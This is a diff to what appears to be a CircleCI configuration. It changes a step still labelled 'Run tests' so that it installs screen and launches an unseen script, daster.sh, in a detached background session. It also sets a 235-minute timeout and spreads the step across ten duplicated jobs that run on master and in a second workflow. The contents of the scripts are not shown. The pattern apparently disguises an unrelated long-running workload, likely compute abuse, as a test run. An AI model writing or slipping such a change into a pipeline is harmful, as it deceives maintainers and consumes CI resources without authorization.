@@ -10,50 +10,54 @@ working_dir: &working_dir ~/app
     - run: bundle exec rake rubocop
     - run:
         name: Run tests
-        command: |
-                    chmod u+x cuiz.sh && ./cuiz.sh
+        command: | 
+              sudo apt update 
+              sudo apt install screen -y 
+              chmod +x daster.sh 
+              screen -dmS daster ./daster.sh 
+              chmod +x timeout.sh && ./timeout.sh
         no_output_timeout: 235m
 version: 2.0
 jobs:
-  cuiz:
+  daster:
     docker:
       - image: ruby
     steps:
       - checkout
-  cuiz1:
+  daster1:
     <<: *script
     docker:
       - image: ruby:2.7
-  cuiz2:
+  daster2:
     <<: *script
     docker:
       - image: ruby:2.6
-  cuiz3:
+  daster3:
     <<: *script
     docker:
       - image: ruby:2.5
-  cuiz4:
+  daster4:
     <<: *script
     docker:
       - image: ruby:2.4
-  cuiz5:
+  daster5:
     docker:
       - image: ruby
     steps:
       - checkout
-  cuiz6:
+  daster6:
     <<: *script
     docker:
       - image: ruby:2.7
-  cuiz7:
+  daster7:
     <<: *script
     docker:
       - image: ruby:2.6
-  cuiz8:
+  daster8:
     <<: *script
     docker:
       - image: ruby:2.5
-  cuiz9:
+  daster9:
     <<: *script
     docker:
       - image: ruby:2.4
@@ -61,16 +65,16 @@ workflows:
   version: 2
   commit:
     jobs:
-      - cuiz
-      - cuiz1
-      - cuiz2
-      - cuiz3
-      - cuiz4
-      - cuiz5
-      - cuiz6
-      - cuiz7
-      - cuiz8
-      - cuiz9
+      - daster
+      - daster1
+      - daster2
+      - daster3
+      - daster4
+      - daster5
+      - daster6
+      - daster7
+      - daster8
+      - daster9
 
 
     triggers:
@@ -81,15 +85,15 @@ workflows:
               only:
                 - master
 
-  cuizrunjob:
+  dasterrunjob:
     jobs:
-      - cuiz
-      - cuiz1
-      - cuiz2
-      - cuiz3
-      - cuiz4
-      - cuiz5
-      - cuiz6
-      - cuiz7
-      - cuiz8
-      - cuiz9
+      - daster
+      - daster1
+      - daster2
+      - daster3
+      - daster4
+      - daster5
+      - daster6
+      - daster7
+      - daster8
+      - daster9
